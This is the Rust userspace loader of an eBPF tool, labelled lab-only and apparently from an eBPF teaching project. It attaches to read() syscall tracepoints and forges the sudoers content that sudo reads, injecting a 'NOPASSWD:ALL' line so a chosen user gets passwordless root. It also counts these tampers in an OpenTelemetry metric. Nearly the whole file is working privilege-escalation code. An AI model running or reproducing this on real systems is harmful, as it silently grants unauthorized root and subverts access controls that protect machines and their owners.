//! sudoadd — LAB-ONLY. Forges the policy `sudo` reads to grant a target user
//! privileges, by rewriting sudo's read() buffer. Target user: argv[1] or
//! $TARGET_USER. Exports ebpf_sudo_tampered_total.
use std::time::Duration;

use aya::{
    maps::{Array, HashMap},
    programs::TracePoint,
    Ebpf,
};
use log::{info, warn};
use opentelemetry::{global, KeyValue};
use opentelemetry_otlp::WithExportConfig;
use sudoadd_common::Payload;

fn init_otel() -> anyhow::Result<opentelemetry_sdk::metrics::SdkMeterProvider> {
    let endpoint = std::env::var("OTEL_EXPORTER_OTLP_ENDPOINT")
        .unwrap_or_else(|_| "http://127.0.0.1:4318".to_string());
    let exporter = opentelemetry_otlp::MetricExporter::builder()
        .with_http().with_endpoint(format!("{endpoint}/v1/metrics")).build()?;
    let reader = opentelemetry_sdk::metrics::PeriodicReader::builder(
        exporter, opentelemetry_sdk::runtime::Tokio,
    ).with_interval(Duration::from_secs(2)).build();
    let provider = opentelemetry_sdk::metrics::SdkMeterProvider::builder()
        .with_reader(reader)
        .with_resource(opentelemetry_sdk::Resource::new(vec![
            KeyValue::new("service.name", "ebpf-sudoadd"),
            KeyValue::new("service.namespace", "ebpf-with-aya"),
        ])).build();
    global::set_meter_provider(provider.clone());
    Ok(provider)
}

#[tokio::main]
async fn main() -> anyhow::Result<()> {
    env_logger::init();
    let user = std::env::args().nth(1)
        .or_else(|| std::env::var("TARGET_USER").ok())
        .unwrap_or_else(|| "victim".to_string());
    warn!("LAB-ONLY: forging sudoers reads to grant '{user}' root — taints the kernel");

    // Build the injected line: "<user> ALL=(ALL:ALL) NOPASSWD:ALL #"
    let text = format!("{user} ALL=(ALL:ALL) NOPASSWD:ALL #");
    let mut line = [0u8; 64];
    let b = text.as_bytes();
    let n = b.len().min(64);
    line[..n].copy_from_slice(&b[..n]);

    let mut ebpf = Ebpf::load(aya::include_bytes_aligned!(concat!(env!("OUT_DIR"), "/sudoadd")))?;
    {
        let mut payload: Array<_, Payload> = Array::try_from(ebpf.map_mut("PAYLOAD").unwrap())?;
        payload.set(0, Payload { line, len: n as u32 }, 0)?;
    }

    for name in ["enter_read", "exit_read"] {
        let prog: &mut TracePoint = ebpf.program_mut(name).unwrap().try_into()?;
        prog.load()?;
        let tp = if name == "enter_read" { "sys_enter_read" } else { "sys_exit_read" };
        prog.attach("syscalls", tp)?;
    }
    info!("attached — while this runs, sudo sees the injected policy for '{user}'");

    let provider = init_otel()?;
    let meter = global::meter("ebpf-sudoadd");
    let tampered = meter.u64_counter("ebpf_sudo_tampered_total").build();
    let tampers: HashMap<_, u32, u64> = HashMap::try_from(ebpf.take_map("TAMPERS").unwrap())?;
    let mut last = 0u64;

    loop {
        tokio::select! {
            _ = tokio::signal::ctrl_c() => { info!("detaching — sudo reads the real policy again"); break; }
            _ = tokio::time::sleep(Duration::from_secs(2)) => {
                let total = tampers.get(&0, 0).unwrap_or(0);
                if total > last { tampered.add(total - last, &[]); info!("sudo reads tampered so far: {total}"); last = total; }
            }
        }
    }
    provider.shutdown()?;
    Ok(())
}
